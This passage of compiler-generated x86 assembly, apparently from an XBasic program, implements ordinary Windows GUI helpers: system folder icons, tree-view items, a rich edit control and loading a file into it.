	xor	eax,eax			;;; i862
align 8
end.GetWindowsDir.client:  ;;; Function end label for Assembly Programmers.
end.func25.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func25.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func25.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetWindowsDir ()  *****
;  *****
;
; [2520] FUNCTION  GetSysFolderIcon (file$, hIconFolder, iIconFolder, hIconFolderOpen, iIconFolderOpen)
.code
;
#ifdef GetSysFolderIcon.file$
#undef GetSysFolderIcon.file$
#endif
#define GetSysFolderIcon.file$ ebp+8	; exposes function argument 'file$'
;
;
#ifdef GetSysFolderIcon.hIconFolder
#undef GetSysFolderIcon.hIconFolder
#endif
#define GetSysFolderIcon.hIconFolder ebp+12	; exposes function argument 'hIconFolder'
;
;
#ifdef GetSysFolderIcon.iIconFolder
#undef GetSysFolderIcon.iIconFolder
#endif
#define GetSysFolderIcon.iIconFolder ebp+16	; exposes function argument 'iIconFolder'
;
;
#ifdef GetSysFolderIcon.hIconFolderOpen
#undef GetSysFolderIcon.hIconFolderOpen
#endif
#define GetSysFolderIcon.hIconFolderOpen ebp+20	; exposes function argument 'hIconFolderOpen'
;
;
#ifdef GetSysFolderIcon.iIconFolderOpen
#undef GetSysFolderIcon.iIconFolderOpen
#endif
#define GetSysFolderIcon.iIconFolderOpen ebp+24	; exposes function argument 'iIconFolderOpen'
;
align 16
_GetSysFolderIcon.client@20:
;  *****
;  *****  FUNCTION  GetSysFolderIcon ()  *****
;  *****
func23.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.449:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.449			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,11				;;; ..
	xor	eax,eax			;;; ...
A.450:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.450			;;; .....
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody23.client:
;
; [2521] SHFILEINFO sfi
; .composites = ebp-40	; internal variable
#ifdef GetSysFolderIcon.sfi
#undef GetSysFolderIcon.sfi
#endif
#define GetSysFolderIcon.sfi ebp-44	; exposes local variable 'sfi'
;
;
; [2523] hSysImageList = SHGetFileInfoA (&file$, 0, &sfi, SIZE(sfi), $$SHGFI_SMALLICON | $$SHGFI_ICON | $$SHGFI_SYSICONINDEX)
#ifdef GetSysFolderIcon.hSysImageList
#undef GetSysFolderIcon.hSysImageList
#endif
#define GetSysFolderIcon.hSysImageList ebp-48	; exposes local variable 'hSysImageList'
;
;
; [0] EXTERNAL FUNCTION SHGetFileInfoA (pszPathAddr, dwFileAttributes, psfi, cbFileInfo, uFlags)
	mov	eax,d[ebp+8]			;;; i642
; .xstk23.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
; .xstk23.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,352			;;; i584
; .xstk23.0002 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,1			;;; i659
	or	eax,256			;;; i763
	or	eax,16384			;;; i763
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_SHGetFileInfoA@20			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [2524] hIconFolder = sfi.hIcon
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp+12],eax			;;; i670
;
; [2525] iIconFolder = sfi.iIcon
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp+16],eax			;;; i670
;
; [2527] il = SHGetFileInfoA (&file$, 0, &sfi, SIZE(sfi), $$SHGFI_SMALLICON | $$SHGFI_ICON | $$SHGFI_OPENICON | $$SHGFI_SYSICONINDEX)
#ifdef GetSysFolderIcon.il
#undef GetSysFolderIcon.il
#endif
#define GetSysFolderIcon.il ebp-76	; exposes local variable 'il'
;
	mov	eax,d[ebp+8]			;;; i642
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,352			;;; i584
	mov	d[ebp-72],eax			;;; i670
	mov	eax,1			;;; i659
	or	eax,256			;;; i763
	or	eax,2			;;; i763
	or	eax,16384			;;; i763
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_SHGetFileInfoA@20			;;; i619
	mov	d[ebp-76],eax			;;; i670
;
; [2528] hIconFolderOpen = sfi.hIcon
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp+20],eax			;;; i670
;
; [2529] iIconFolderOpen = sfi.iIcon
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp+24],eax			;;; i670
;
; [2531] RETURN hSysImageList
	mov	eax,d[ebp-48]			;;; i665
	jmp	end.func23.client			;;; i258
;
; [2532] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetSysFolderIcon.client:  ;;; Function end label for Assembly Programmers.
end.func23.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetSysFolderIcon ()  *****
;  *****
;
; [2534] FUNCTION  AddTreeViewItem (hwndCtl, hParent,STRING label, idxImage, idxSelectedImage, hInsertAfter)
.code
;
#ifdef AddTreeViewItem.hwndCtl
#undef AddTreeViewItem.hwndCtl
#endif
#define AddTreeViewItem.hwndCtl ebp+8	; exposes function argument 'hwndCtl'
;
;
#ifdef AddTreeViewItem.hParent
#undef AddTreeViewItem.hParent
#endif
#define AddTreeViewItem.hParent ebp+12	; exposes function argument 'hParent'
;
;
#ifdef AddTreeViewItem.label
#undef AddTreeViewItem.label
#endif
#define AddTreeViewItem.label ebp+16	; exposes function argument 'label'
;
;
#ifdef AddTreeViewItem.idxImage
#undef AddTreeViewItem.idxImage
#endif
#define AddTreeViewItem.idxImage ebp+20	; exposes function argument 'idxImage'
;
;
#ifdef AddTreeViewItem.idxSelectedImage
#undef AddTreeViewItem.idxSelectedImage
#endif
#define AddTreeViewItem.idxSelectedImage ebp+24	; exposes function argument 'idxSelectedImage'
;
;
#ifdef AddTreeViewItem.hInsertAfter
#undef AddTreeViewItem.hInsertAfter
#endif
#define AddTreeViewItem.hInsertAfter ebp+28	; exposes function argument 'hInsertAfter'
;
align 16
_AddTreeViewItem.client@24:
;  *****
;  *****  FUNCTION  AddTreeViewItem ()  *****
;  *****
func22.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody22.client:
;
; [2535] STATIC TV_INSERTSTRUCT tvis
data section 'globals$statics'
align	4
%22%tvis.client:	db 4 dup ?
.code
;
; [2536] STATIC TV_ITEM tvi
data section 'globals$statics'
align	4
%22%tvi.client:	db 4 dup ?
.code
;
; [2538] tvi.mask 			= $$TVIF_TEXT  | $$TVIF_PARAM' | $$TVIF_IMAGE | $$TVIF_SELECTEDIMAGE
	mov	eax,1			;;; i659
	or	eax,4			;;; i763
	mov	ebx,d[%22%tvi.client]			;;; i663a
	mov	d[ebx],eax			;;; i13b
;
; [2539] tvi.pszText 		= &label
	mov	eax,d[ebp+16]			;;; i642
	mov	ebx,d[%22%tvi.client]			;;; i663a
	mov	d[ebx+16],eax			;;; i13b
;
; [2540] tvi.cchTextMax 		= LEN(label)
	mov	eax,d[ebp+16]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.451			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.451:
	mov	ebx,d[%22%tvi.client]			;;; i663a
	mov	d[ebx+20],eax			;;; i13b
;
; [2541] tvi.iImage	 = idxImage
	mov	eax,d[%22%tvi.client]			;;; i663a
	mov	ebx,d[ebp+20]			;;; i665
	mov	d[eax+24],ebx			;;; i13b
;
; [2542] tvi.iSelectedImage	= idxSelectedImage
	mov	eax,d[%22%tvi.client]			;;; i663a
	mov	ebx,d[ebp+24]			;;; i665
	mov	d[eax+28],ebx			;;; i13b
;
; [2543] tvis.hParent 		= hParent
	mov	eax,d[%22%tvis.client]			;;; i663a
	mov	ebx,d[ebp+12]			;;; i665
	mov	d[eax],ebx			;;; i13b
;
; [2544] tvis.hInsertAfter 	= hInsertAfter
	mov	eax,d[%22%tvis.client]			;;; i663a
	mov	ebx,d[ebp+28]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [2545] tvis.item 			= tvi
	mov	eax,d[%22%tvis.client]			;;; i663a
	mov	ebx,d[%22%tvi.client]			;;; i663a
	lea	edi,[eax+8]			;;; i14b
	mov	esi,ebx			;;; i7
	mov	ecx,40			;;; i1
	call	%_AssignComposite			;;; i2
;
; [2547] RETURN SendMessageA (hwndCtl, $$TVM_INSERTITEM, 0, &tvis)
	mov	eax,d[%22%tvis.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	4352			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
	jmp	end.func22.client			;;; i258
;
; [2548] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.AddTreeViewItem.client:  ;;; Function end label for Assembly Programmers.
end.func22.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	24			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  AddTreeViewItem ()  *****
;  *****
;
; [2551] FUNCTION  CreateRichEdit (x, y, w, h, hParent, id, kbTextMax)
.code
;
#ifdef CreateRichEdit.x
#undef CreateRichEdit.x
#endif
#define CreateRichEdit.x ebp+8	; exposes function argument 'x'
;
;
#ifdef CreateRichEdit.y
#undef CreateRichEdit.y
#endif
#define CreateRichEdit.y ebp+12	; exposes function argument 'y'
;
;
#ifdef CreateRichEdit.w
#undef CreateRichEdit.w
#endif
#define CreateRichEdit.w ebp+16	; exposes function argument 'w'
;
;
#ifdef CreateRichEdit.h
#undef CreateRichEdit.h
#endif
#define CreateRichEdit.h ebp+20	; exposes function argument 'h'
;
;
#ifdef CreateRichEdit.hParent
#undef CreateRichEdit.hParent
#endif
#define CreateRichEdit.hParent ebp+24	; exposes function argument 'hParent'
;
;
#ifdef CreateRichEdit.id
#undef CreateRichEdit.id
#endif
#define CreateRichEdit.id ebp+28	; exposes function argument 'id'
;
;
#ifdef CreateRichEdit.kbTextMax
#undef CreateRichEdit.kbTextMax
#endif
#define CreateRichEdit.kbTextMax ebp+32	; exposes function argument 'kbTextMax'
;
align 16
_CreateRichEdit.client@28:
;  *****
;  *****  FUNCTION  CreateRichEdit ()  *****
;  *****
func65.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func65.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.456:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.456			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody65.client:
;
; [2553] SHARED hInst
;
; [2555] ' load riched20.dll or riched32.dll if available
;
; [2557] class$ = "richedit20A"
#ifdef CreateRichEdit.class$
#undef CreateRichEdit.class$
#endif
#define CreateRichEdit.class$ ebp-40	; exposes local variable 'class$'
;
	mov	eax,addr @_string.05D1.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2558] hRichEditDll = LoadLibraryA (&"riched20.dll")
#ifdef CreateRichEdit.hRichEditDll
#undef CreateRichEdit.hRichEditDll
#endif
#define CreateRichEdit.hRichEditDll ebp-44	; exposes local variable 'hRichEditDll'
;
;
; [0] EXTERNAL FUNCTION LoadLibraryA (lpLibFileName)
	mov	eax,addr @_string.05D3.client			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2559] IFZ hRichEditDll THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0105.client			;;; i195
;
; [2560] class$ = "richedit"
	mov	eax,addr @_string.05D4.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2561] hRichEditDll = LoadLibraryA (&"riched32.dll")
	mov	eax,addr @_string.05D5.client			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2562] END IF
else.0105.client:
end.if.0105.client:
;
; [2563] IFZ hRichEditDll THEN RETURN 0
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0106.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func65.client			;;; i258
else.0106.client:
end.if.0106.client:
;
; [2565] ' create rich edit child window
;
; [2566] style = $$WS_VISIBLE | $$WS_CHILD
#ifdef CreateRichEdit.style
#undef CreateRichEdit.style
#endif
#define CreateRichEdit.style ebp-48	; exposes local variable 'style'
;
	mov	eax,268435456			;;; i657
	or	eax,1073741824			;;; i763
	mov	d[ebp-48],eax			;;; i670
;
; [2567] style = style | $$ES_MULTILINE  | $$ES_READONLY'  | $$ES_SUNKEN
	mov	eax,d[ebp-48]			;;; i665
	or	eax,4			;;; i763
	or	eax,2048			;;; i763
	mov	d[ebp-48],eax			;;; i670
;
; [2568] style = style | $$WS_VSCROLL'  | $$WS_HSCROLL
	mov	eax,d[ebp-48]			;;; i665
	or	eax,2097152			;;; i763
	mov	d[ebp-48],eax			;;; i670
;
; [2569] style = style | $$ES_AUTOVSCROLL' | $$ES_AUTOHSCROLL
	mov	eax,d[ebp-48]			;;; i665
	or	eax,64			;;; i763
	mov	d[ebp-48],eax			;;; i670
;
; [2570] style = style | $$ES_NOHIDESEL | $$ES_SAVESEL
	mov	eax,d[ebp-48]			;;; i665
	or	eax,256			;;; i763
	or	eax,32768			;;; i763
	mov	d[ebp-48],eax			;;; i670
;
; [2571] style = style | $$ES_WANTRETURN' | $$WS_OVERLAPPED
	mov	eax,d[ebp-48]			;;; i665
	or	eax,4096			;;; i763
	mov	d[ebp-48],eax			;;; i670
;
; [2573] exstyle =  $$WS_EX_STATICEDGE
#ifdef CreateRichEdit.exstyle
#undef CreateRichEdit.exstyle
#endif
#define CreateRichEdit.exstyle ebp-52	; exposes local variable 'exstyle'
;
	mov	eax,131072			;;; i657
	mov	d[ebp-52],eax			;;; i670
;
; [2574] 'style = style | $$ES_MULTILINE | $$ES_READONLY | $$ES_LEFT
;
; [2575] '	class$ = "richedit"										' riched32.dll
;
; [2576] '	class$ = "richedit20A"								' riched20.dll
;
; [2577] hRichEd =  CreateWindowExA (exstyle, &class$, 0, style, x, y, w, h, hParent, id, hInst, 0)
#ifdef CreateRichEdit.hRichEd
#undef CreateRichEdit.hRichEd
#endif
#define CreateRichEdit.hRichEd ebp-56	; exposes local variable 'hRichEd'
;
	mov	eax,d[ebp-40]			;;; i642
; .xstk65.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	0			;;; i656a
	push	[%hInst.client]			;;; i672a
	push	[ebp+28]			;;; i674a
	push	[ebp+24]			;;; i674a
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	_CreateWindowExA@48			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [2579] ' set upper limit to amount of text in rich edit control
;
; [2580] ' default upper limit is 32k, max upper is 2GB
;
; [2581] SendMessageA (hRichEd, $$EM_EXLIMITTEXT, 0, 1024*kbTextMax)
	mov	eax,1024			;;; i659
	mov	ebx,d[ebp+32]			;;; i665
	imul	eax,ebx			;;; i805
	push	eax			;;; i667a
	push	0			;;; i656a
	push	1077			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [2583] RETURN hRichEd
	mov	eax,d[ebp-56]			;;; i665
	jmp	end.func65.client			;;; i258
;
; [2584] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CreateRichEdit.client:  ;;; Function end label for Assembly Programmers.
end.func65.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func65.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	28			;;; i111a
free.func65.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  CreateRichEdit ()  *****
;  *****
;
; [2585] '
;
; [2587] ' PURPOSE : Set the text or richtext in a RichEdit control.
;
; [2588] '           format can be $$SF_TEXT (text) or $$SF_RTF (rich text format)
;
; [2589] '           The $$SFF_SELECTION flag is used to replace the contents of
;
; [2590] '           the current selection.
;
; [2591] '
;
; [2592] FUNCTION  SetRichEditText (hWndRichEdit, fileName$, format)
.code
;
#ifdef SetRichEditText.hWndRichEdit
#undef SetRichEditText.hWndRichEdit
#endif
#define SetRichEditText.hWndRichEdit ebp+8	; exposes function argument 'hWndRichEdit'
;
;
#ifdef SetRichEditText.fileName$
#undef SetRichEditText.fileName$
#endif
#define SetRichEditText.fileName$ ebp+12	; exposes function argument 'fileName$'
;
;
#ifdef SetRichEditText.format
#undef SetRichEditText.format
#endif
#define SetRichEditText.format ebp+16	; exposes function argument 'format'
;
align 16
_SetRichEditText.client@12:
;  *****
;  *****  FUNCTION  SetRichEditText ()  *****
;  *****
func64.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.460:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.460			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody64.client:
;
; [2594] EDITSTREAM stream
; .composites = ebp-40	; internal variable
#ifdef SetRichEditText.stream
#undef SetRichEditText.stream
#endif
#define SetRichEditText.stream ebp-44	; exposes local variable 'stream'
;
;
; [2595] IFZ fileName$ THEN RETURN
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.457			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0107.client			;;; i192
A.457:
	xor	eax,eax			;;; i862
	jmp	end.func64.client			;;; i258
else.0107.client:
end.if.0107.client:
;
; [2596] IFZ hWndRichEdit THEN RETURN
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0108.client			;;; i195
	xor	eax,eax			;;; i862
	jmp	end.func64.client			;;; i258
else.0108.client:
end.if.0108.client:
;
; [2597] IFZ format THEN format = $$SF_RTF
	mov	eax,d[ebp+16]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0109.client			;;; i195
	mov	eax,2			;;; i659
	mov	d[ebp+16],eax			;;; i670
else.0109.client:
end.if.0109.client:
;
; [2599] hFile = CreateFileA (&fileName$, $$GENERIC_READ, $$FILE_SHARE_READ | $$FILE_SHARE_WRITE, 0, $$OPEN_EXISTING, $$FILE_ATTRIBUTE_NORMAL, 0)
#ifdef SetRichEditText.hFile
#undef SetRichEditText.hFile
#endif
#define SetRichEditText.hFile ebp-48	; exposes local variable 'hFile'
;
;
; [0] EXTERNAL FUNCTION CreateFileA (lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)
	mov	eax,d[ebp+12]			;;; i642
; .xstk64.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,1			;;; i659
	or	eax,2			;;; i763
; .xstk64.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	0			;;; i656a
	push	128			;;; i656a
	push	3			;;; i656a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	push	-2147483648			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateFileA@28			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [2600] IF hFile = $$INVALID_HANDLE_VALUE THEN RETURN
	mov	eax,d[ebp-48]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.010A.client			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.func64.client			;;; i258
else.010A.client:
end.if.010A.client:
;
; [2602] stream.dwCookie    = hFile
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	mov	d[eax],ebx			;;; i13b
;
; [2603] stream.pfnCallback = &EditStreamCallback()
	mov	eax,addr _EditStreamCallback.client@16			;;; i599
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+8],eax			;;; i13b
;
; [2604] SendMessageA (hWndRichEdit, $$EM_STREAMIN, format, &stream)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp+16]			;;; i674a
	push	1097			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [2605] CloseHandle (hFile)
;
; [0] EXTERNAL FUNCTION CloseHandle (hObject)
	push	[ebp-48]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [2607] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SetRichEditText.client:  ;;; Function end label for Assembly Programmers.
end.func64.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SetRichEditText ()  *****
;  *****
;
; [2609] FUNCTION  EditStreamCallback (dwCookie, pbBuff, cb, pcb)
.code
;
#ifdef EditStreamCallback.dwCookie
#undef EditStreamCallback.dwCookie
#endif
#define EditStreamCallback.dwCookie ebp+8	; exposes function argument 'dwCookie'
;
;
#ifdef EditStreamCallback.pbBuff
#undef EditStreamCallback.pbBuff
#endif
#define EditStreamCallback.pbBuff ebp+12	; exposes function argument 'pbBuff'
;
;
#ifdef EditStreamCallback.cb
#undef EditStreamCallback.cb
#endif
#define EditStreamCallback.cb ebp+16	; exposes function argument 'cb'
;
;
#ifdef EditStreamCallback.pcb
#undef EditStreamCallback.pcb
#endif
#define EditStreamCallback.pcb ebp+20	; exposes function argument 'pcb'
;
align 16
_EditStreamCallback.client@16:
;  *****
;  *****  FUNCTION  EditStreamCallback ()  *****
;  *****
func63.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody63.client:
;
; [2611] bytesRead = 0
#ifdef EditStreamCallback.bytesRead
#undef EditStreamCallback.bytesRead
#endif
#define EditStreamCallback.bytesRead ebp-40	; exposes local variable 'bytesRead'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [2612] error = ReadFile (dwCookie, pbBuff, cb, &bytesRead, 0)
#ifdef EditStreamCallback.error
#undef EditStreamCallback.error
#endif
#define EditStreamCallback.error ebp-44	; exposes local variable 'error'
;
;
; [0] EXTERNAL FUNCTION ReadFile (hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
	lea	eax,[ebp-40]			;;; i642
; .xstk63.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_ReadFile@20			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2613] 'XstCopyMemory (&bytesRead, pcb, 4)
;
; [2614] memcpy (pcb,&bytesRead, 4)
;
; [0] EXTERNAL CFUNCTION  memcpy (destAddr, srcAddr, n)		' copy n bytes from src buffer to dest buffer
	lea	eax,[ebp-40]			;;; i642
	mov	d[ebp-52],eax			;;; i670
	push	4			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp+20]			;;; i674a
	call	_memcpy			;;; i619
	add	esp,12			;;; i633
;
; [2615] IFZ bytesRead THEN RETURN error
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.010B.client			;;; i195
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func63.client			;;; i258
else.010B.client:
end.if.010B.client:
;
; [2616] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func63.client			;;; i258
;
; [2618] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EditStreamCallback.client:  ;;; Function end label for Assembly Programmers.
end.func63.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  EditStreamCallback ()  *****
;  *****
;
; [2621] FUNCTION LaunchBrowser (url$)' function taken from 'launchbrowser' by D.S.
.code
;
#ifdef LaunchBrowser.url$
#undef LaunchBrowser.url$
#endif
#define LaunchBrowser.url$ ebp+8	; exposes function argument 'url$'
;
align 16
_LaunchBrowser.client@4:
;  *****
;  *****  FUNCTION  LaunchBrowser ()  *****
;  *****
func67.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func67.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
